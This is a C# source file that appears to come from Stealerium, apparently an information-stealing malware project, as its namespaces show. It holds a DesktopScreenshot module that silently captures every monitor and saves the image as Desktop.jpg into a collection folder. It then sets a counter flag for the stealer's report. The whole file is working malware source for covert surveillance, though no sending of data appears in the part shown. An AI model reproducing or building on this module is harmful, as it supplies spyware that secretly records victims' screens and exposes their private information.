using System;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Stealerium.Helpers;

namespace Stealerium.Target.System
{
    internal static class DesktopScreenshot
    {
        // Importing the necessary method to handle DPI scaling
        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        public static void Make(string sSavePath)
        {
            try
            {
                // Ensure the process is DPI aware
                SetProcessDPIAware();

                // Get the bounds of the virtual screen, which includes all monitors
                var bounds = SystemInformation.VirtualScreen;

                using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (var g = Graphics.FromImage(bitmap))
                    {
                        // Adjust starting points to capture the entire virtual screen
                        g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
                    }

                    // Use Path.Combine for better path handling
                    string filePath = Path.Combine(sSavePath, "Desktop.jpg");
                    bitmap.Save(filePath, ImageFormat.Jpeg);
                }

                Counter.DesktopScreenshot = true;
            }
            catch (Exception ex)
            {
                Logging.Log("DesktopScreenshot >> Failed to create\n" + ex, false);
            }
        }
    }
}
